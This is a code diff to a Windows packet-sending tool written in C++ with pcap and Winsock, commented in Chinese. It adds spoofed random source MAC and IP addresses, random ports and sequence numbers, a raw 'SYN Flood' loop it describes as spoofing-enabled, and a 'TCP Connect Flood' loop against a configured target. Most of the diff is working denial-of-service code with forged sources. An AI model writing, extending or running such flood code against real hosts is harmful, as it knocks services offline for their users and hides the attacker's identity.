@@ -52,6 +52,70 @@ static unsigned short get_random_ushort() {
     return static_cast<unsigned short>(dist(*g_rng));
 }
 
+// [新增] 生成随机MAC地址（避免多播位和本地管理位）
+static void get_random_mac(unsigned char* mac) {
+    init_random_generator();
+    std::uniform_int_distribution<unsigned int> byte_dist(0, 255);
+    
+    // MAC地址格式：XX:XX:XX:XX:XX:XX
+    // 第一个字节的最低位（bit 0）必须为0（单播地址）
+    // 第一个字节的次低位（bit 1）必须为0（全局管理地址，非本地管理）
+    // 所以第一个字节的范围是：0x00-0xFD（排除0xFE和0xFF）
+    mac[0] = (unsigned char)(byte_dist(*g_rng) & 0xFE); // 确保bit 0为0
+    if (mac[0] >= 0xFE) mac[0] = 0xFC; // 确保bit 1也为0
+    
+    // 其余5个字节可以是任意值（0-255）
+    for (int i = 1; i < 6; ++i) {
+        mac[i] = (unsigned char)byte_dist(*g_rng);
+    }
+}
+
+// [新增] 生成随机IP地址（基于子网范围）
+static void get_random_ip(const unsigned char* base_ip, const unsigned char* mask, unsigned char* out_ip) {
+    init_random_generator();
+    std::uniform_int_distribution<unsigned int> byte_dist(0, 255);
+    
+    // 计算网络地址
+    unsigned char network[4];
+    for (int i = 0; i < 4; ++i) {
+        network[i] = base_ip[i] & mask[i];
+    }
+    
+    // 生成网络范围内的随机IP
+    // 对于每个字节：
+    // - 如果掩码字节为255，使用网络地址的该字节（保持不变）
+    // - 如果掩码字节为0，完全随机
+    // - 如果掩码字节在中间，需要按位处理（简化处理：如果掩码不是0或255，使用网络地址）
+    for (int i = 0; i < 4; ++i) {
+        if (mask[i] == 255) {
+            // 掩码为255，该字节必须与网络地址相同
+            out_ip[i] = network[i];
+        } else if (mask[i] == 0) {
+            // 掩码为0，该字节完全随机
+            out_ip[i] = (unsigned char)byte_dist(*g_rng);
+        } else {
+            // 掩码在中间（如128, 192等），简化处理：使用网络地址部分+随机部分
+            // 为了简化，这里也使用随机值，但实际应该按位处理
+            out_ip[i] = (unsigned char)byte_dist(*g_rng);
+        }
+    }
+    
+    // 确保生成的IP不是网络地址（最后一个字节为0）或广播地址（最后一个字节为255）
+    // 对于/24子网，只需要检查最后一个字节
+    if (mask[3] == 0) {
+        // 如果最后一个字节的掩码为0，确保不是0或255
+        if (out_ip[3] == 0) out_ip[3] = 1;
+        if (out_ip[3] == 255) out_ip[3] = 254;
+    } else if (mask[3] == 255) {
+        // 如果最后一个字节的掩码为255，使用网络地址（但通常不会是0，因为base_ip[3]通常是0）
+        // 这里保持原值
+    } else {
+        // 其他情况，确保不是0或255
+        if (out_ip[3] == 0) out_ip[3] = 1;
+        if (out_ip[3] == 255) out_ip[3] = 254;
+    }
+}
+
 // === Socket Specific Variables ===
 std::atomic<bool> g_is_sock_sending{false};
 std::atomic<uint64_t> g_sock_total_sent{0};
@@ -532,15 +596,49 @@ static void build_package(unsigned char* package, int* package_len, int seq_num,
             build_dns(package, domain, dns_pkg_len);
         } break;
         case TCP_PACKAGE: {
+            // [新增] SYN Flood 模式：随机源端口和随机序列号
+            unsigned short actual_s_port = s_port;
+            unsigned int actual_seq = seq_num;
+            
+            // [新增] 随机源MAC地址
+            unsigned char actual_src_mac[6];
+            if (cfg->use_random_src_mac) {
+                get_random_mac(actual_src_mac);
+            } else {
+                memcpy(actual_src_mac, cfg->src_mac, 6);
+            }
+            
+            // [新增] 随机源IP地址
+            unsigned char actual_src_ip[4];
+            if (cfg->use_random_src_ip) {
+                get_random_ip(cfg->random_ip_base, cfg->random_ip_mask, actual_src_ip);
+            } else {
+                memcpy(actual_src_ip, cfg->src_ip, 4);
+            }
+            
+            if (cfg->use_random_src_port) {
+                // 使用随机源端口（范围：1024-65535，避免使用系统保留端口）
+                init_random_generator();
+                std::uniform_int_distribution<unsigned int> port_dist(1024, 65535);
+                actual_s_port = (unsigned short)port_dist(*g_rng);
+            }
+            
+            if (cfg->use_random_seq) {
+                // 使用随机序列号（32位，包含0）
+                init_random_generator();
+                std::uniform_int_distribution<unsigned int> seq_dist(0, 0xFFFFFFFF);
+                actual_seq = seq_dist(*g_rng);
+            }
+            
             int tcp_data_len = cfg->payload_len;
             int tcp_total_len = 20 + tcp_data_len;
             ip_len = 20 + tcp_total_len;
             *package_len = 14 + ip_len;
-            build_ethernet_header(package, cfg->des_mac, cfg->src_mac, 0x0800);
-            build_ip_header(package, cfg->src_ip, cfg->des_ip, (unsigned short)ip_len, 0x06);
+            build_ethernet_header(package, cfg->des_mac, actual_src_mac, 0x0800);
+            build_ip_header(package, actual_src_ip, cfg->des_ip, (unsigned short)ip_len, 0x06);
             fill_payload_data(package + 14 + 20 + 20, tcp_data_len, cfg);
-            build_tcp_header(package, s_port, d_port, seq_num, 0, cfg->tcp_flags, 64240, (u_short)tcp_data_len,
-                             cfg->src_ip, cfg->des_ip);
+            build_tcp_header(package, actual_s_port, d_port, actual_seq, 0, cfg->tcp_flags, 64240, (u_short)tcp_data_len,
+                             actual_src_ip, cfg->des_ip);
         } break;
         default:
             *package_len = 0;
@@ -619,7 +717,7 @@ void run_normal_mode(pcap_t* fp, const SenderConfig* cfg) {
     pcap_send_queue* squeue = pcap_sendqueue_alloc(queue_mem_size);
     if (!squeue) return;
 
-    unsigned int seq_counter = 1;
+    unsigned int seq_counter = 0; // [修改] 序列号从0开始
     auto next_batch_time = std::chrono::steady_clock::now();
 
     struct pcap_pkthdr pktheader;
@@ -683,6 +781,18 @@ void run_normal_mode(pcap_t* fp, const SenderConfig* cfg) {
     pcap_sendqueue_destroy(squeue);
 }
 
+// [新增] 辅助函数：解析字符串IP到字节数组
+static void parse_ip_str(const char* ip_str, unsigned char* out_ip) {
+    if (!ip_str || !out_ip) return;
+    int a, b, c, d;
+    if (sscanf(ip_str, "%d.%d.%d.%d", &a, &b, &c, &d) == 4) {
+        out_ip[0] = (unsigned char)a;
+        out_ip[1] = (unsigned char)b;
+        out_ip[2] = (unsigned char)c;
+        out_ip[3] = (unsigned char)d;
+    }
+}
+
 extern "C" void start_send_mode(const SenderConfig* config) {
     char errbuf[PCAP_ERRBUF_SIZE];
     if (!config || !config->dev_name[0]) {
@@ -733,6 +843,177 @@ extern "C" void start_socket_send_mode(const SocketConfig* config) {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
 
+    struct sockaddr_in dest_addr;
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = htons(config->target_port);
+    dest_addr.sin_addr.s_addr = inet_addr(config->target_ip);
+
+    // --- [修正：逻辑优先级] 只要开启了伪造模式（随机MAC或随机IP），就强制进入 Raw 模式 ---
+    // 因为标准 Socket 无法伪造身份，无论用户是否勾选了 Connect Mode。
+    if (!config->is_udp && (config->use_random_src_mac || config->use_random_src_ip)) {
+        LOG_SOCK(1, "[SOCK] Mode: Raw SYN Flood (Spoofing Enabled)");
+        if (config->is_connect_only) {
+            LOG_SOCK(2, "[SOCK] Note: Full Handshake is not possible with Spoofing. Using Raw SYN instead.");
+        }
+        
+        char errbuf[PCAP_ERRBUF_SIZE];
+        pcap_t* adhandle = pcap_open(config->dev_name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
+        if (adhandle == NULL) {
+            LOG_SOCK(2, "[SOCK] Error: Unable to open adapter %s", config->dev_name);
+            WSACleanup();
+            return;
+        }
+
+        // 构造基本的 SenderConfig 用于复用左侧的 build_package 逻辑
+        SenderConfig raw_cfg;
+        memset(&raw_cfg, 0, sizeof(raw_cfg));
+        raw_cfg.packet_type = TCP_PACKAGE;
+        raw_cfg.tcp_flags = 0x02; // SYN
+        raw_cfg.payload_len = config->payload_len;
+        raw_cfg.payload_mode = PAYLOAD_RANDOM;
+        raw_cfg.src_port = config->source_port;
+        raw_cfg.dst_port = config->target_port;
+        raw_cfg.use_random_src_port = config->use_random_src_port;
+        raw_cfg.use_random_src_mac = config->use_random_src_mac;
+        raw_cfg.use_random_src_ip = config->use_random_src_ip;
+        raw_cfg.use_random_seq = config->use_random_seq;
+        
+        // 复制地址信息
+        parse_ip_str(config->target_ip, raw_cfg.des_ip);
+        parse_ip_str(config->source_ip, raw_cfg.src_ip);
+        memcpy(raw_cfg.src_mac, config->src_mac, 6);
+        memcpy(raw_cfg.random_ip_base, config->random_ip_base, 4);
+        memcpy(raw_cfg.random_ip_mask, config->random_ip_mask, 4);
+
+        // 设置目的MAC（此处简化处理：使用FF:FF...或需要ARPLookup）
+        memset(raw_cfg.des_mac, 0xFF, 6); 
+
+        unsigned char packet[1500];
+        int pkg_len = 0;
+        int seq = 0;
+
+        while (g_is_sock_sending) {
+            build_package(packet, &pkg_len, seq++, &raw_cfg);
+            if (pcap_sendpacket(adhandle, packet, pkg_len) == 0) {
+                g_sock_total_sent++;
+                g_sock_total_bytes += pkg_len;
+            }
+
+            if (config->interval_us > 0) {
+                std::this_thread::sleep_for(std::chrono::microseconds(config->interval_us));
+            }
+
+            auto now = std::chrono::steady_clock::now();
+            static auto last_stats_time = now;
+            if (std::chrono::duration_cast<std::chrono::milliseconds>(now - last_stats_time).count() >= 30) {
+                if (config->stats_callback) config->stats_callback(g_sock_total_sent, g_sock_total_bytes);
+                last_stats_time = now;
+            }
+        }
+
+        pcap_close(adhandle);
+        WSACleanup();
+        return;
+    }
+
+    // [新增] 专门的 TCP 连接模式处理
+    if (!config->is_udp && config->is_connect_only) {
+        LOG_SOCK(1, "[SOCK] Mode: TCP Connect Flood (Complete Lifecycle)");
+        
+        while (g_is_sock_sending) {
+            SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (sockfd == INVALID_SOCKET) {
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                continue;
+            }
+
+            // [修复] 允许地址/端口重用，解决指定端口时的 TIME_WAIT 问题
+            int opt = 1;
+            setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
+            
+            // [修复] 设置 LINGER 为 0，强制立即关闭并释放端口 (发送 RST 而非 FIN)
+            // 这可以防止端口卡在 TIME_WAIT 状态，从而支持高频指定端口连接
+            linger so_linger = {1, 0}; 
+            setsockopt(sockfd, SOL_SOCKET, SO_LINGER, (char*)&so_linger, sizeof(so_linger));
+
+            // 设置非阻塞以便快速超时
+            u_long mode = 1;
+            ioctlsocket(sockfd, FIONBIO, &mode);
+
+            // [新增] 强制绑定到选定网卡的源 IP 和端口
+            if (config->source_ip[0] != '\0' && strcmp(config->source_ip, "0.0.0.0") != 0) {
+                struct sockaddr_in local_addr;
+                memset(&local_addr, 0, sizeof(local_addr));
+                local_addr.sin_family = AF_INET;
+                local_addr.sin_addr.s_addr = inet_addr(config->source_ip);
+                
+                // [修复] 如果开启了随机端口，则设为 0 让系统自动分配新的临时端口
+                if (config->use_random_src_port) {
+                    local_addr.sin_port = 0; 
+                } else {
+                    local_addr.sin_port = htons(config->source_port); 
+                }
+
+                if (bind(sockfd, (struct sockaddr*)&local_addr, sizeof(local_addr)) == SOCKET_ERROR) {
+                    int err = WSAGetLastError();
+                    if (!config->use_random_src_port && config->source_port != 0 && g_is_sock_sending) {
+                        LOG_SOCK(2, "[SOCK] Bind failed on port %d, error: %d", config->source_port, err);
+                    }
+                }
+            }
+
+            // 执行连接（三次握手）
+            int connect_ret = connect(sockfd, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
+            bool connected = false;
+
+            if (connect_ret == 0) {
+                connected = true;
+            } else {
+                int err = WSAGetLastError();
+                if (err == WSAEWOULDBLOCK) {
+                    fd_set write_fds;
+                    FD_ZERO(&write_fds);
+                    FD_SET(sockfd, &write_fds);
+                    timeval tv = {0, 500000}; // 增加到 500ms 超时
+                    if (select(0, NULL, &write_fds, NULL, &tv) > 0) {
+                        connected = true;
+                    }
+                }
+            }
+
+            if (connected) {
+                // 连接建立后，发送一次配置的载荷数据
+                int data_len = config->payload_len > 0 ? config->payload_len : 1;
+                std::vector<char> temp_buf(data_len, 'X');
+                send(sockfd, temp_buf.data(), data_len, 0);
+                
+                g_sock_total_sent++;
+                g_sock_total_bytes += data_len;
+            }
+
+            // 立即关闭
+            closesocket(sockfd);
+
+            // 统计回调
+            auto now = std::chrono::steady_clock::now();
+            static auto last_stats_time = now;
+            if (std::chrono::duration_cast<std::chrono::milliseconds>(now - last_stats_time).count() >= 30) {
+                if (config->stats_callback) config->stats_callback(g_sock_total_sent, g_sock_total_bytes);
+                last_stats_time = now;
+            }
+
+            // 间隔控制
+            if (config->interval_us > 0) {
+                std::this_thread::sleep_for(std::chrono::microseconds(config->interval_us));
+            }
+        }
+        
+        WSACleanup();
+        return;
+    }
+
+    // --- 以下为原有的数据发送模式 ---
     SOCKET sockfd = INVALID_SOCKET;
     int type = config->is_udp ? SOCK_DGRAM : SOCK_STREAM;
     int proto = config->is_udp ? IPPROTO_UDP : IPPROTO_TCP;
@@ -759,18 +1040,12 @@ extern "C" void start_socket_send_mode(const SocketConfig* config) {
         memset(&local_addr, 0, sizeof(local_addr));
         local_addr.sin_family = AF_INET;
         local_addr.sin_addr.s_addr = inet_addr(config->source_ip);
-        local_addr.sin_port = 0;
+        local_addr.sin_port = htons(config->source_port); // [修复] 使用用户设置的源端口
         int bind_result = bind(sockfd, (struct sockaddr*)&local_addr, sizeof(local_addr));
         if (bind_result < 0) {
             std::cerr << "[WARN] Failed to bind to source IP: " << config->source_ip << std::endl;
         }
     }
-
-    struct sockaddr_in dest_addr;
-    memset(&dest_addr, 0, sizeof(dest_addr));
-    dest_addr.sin_family = AF_INET;
-    dest_addr.sin_port = htons(config->target_port);
-    dest_addr.sin_addr.s_addr = inet_addr(config->target_ip);
 
     if (!config->is_udp) {
         u_long mode = 1;
